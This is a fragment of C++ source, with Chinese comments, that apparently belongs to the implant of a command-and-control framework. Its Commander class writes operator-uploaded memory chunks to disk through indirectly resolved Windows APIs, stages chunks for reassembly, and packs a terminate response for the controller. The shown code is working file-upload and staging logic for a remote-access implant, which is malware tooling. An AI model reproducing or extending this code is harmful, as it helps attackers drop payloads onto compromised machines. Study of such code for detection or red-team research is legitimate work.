	if ( !agent->memorysaver->chunks.contains(memoryId) )
		return;

	MemoryData memData = agent->memorysaver->chunks[memoryId];
	if (memData.complete) {

		BOOL  result  = false;
		DWORD written = 0;

		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);

		if (result) {
			outPacker->Pack32(COMMAND_UPLOAD);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
	agent->memorysaver->RemoveMemoryData(memoryId);
}

// CmdSaveMemory 保存一片内存数据，供后续多片拼接或任务使用。
void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId   = inPacker->Unpack32();
	ULONG totalSize  = inPacker->Unpack32();
	ULONG bufferSize = 0;
	BYTE* buffer     = inPacker->UnpackBytes(&bufferSize);
	ULONG taskId     = inPacker->Unpack32();

	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
}

// Exit 把 agent 标记为不活跃，并打包一个结束响应。
void Commander::Exit(Packer* outPacker)
{
	outPacker->Pack32(agent->config->exit_task_id);
	outPacker->Pack32(COMMAND_TERMINATE);
	outPacker->Pack32(agent->config->exit_method);
}
#endif
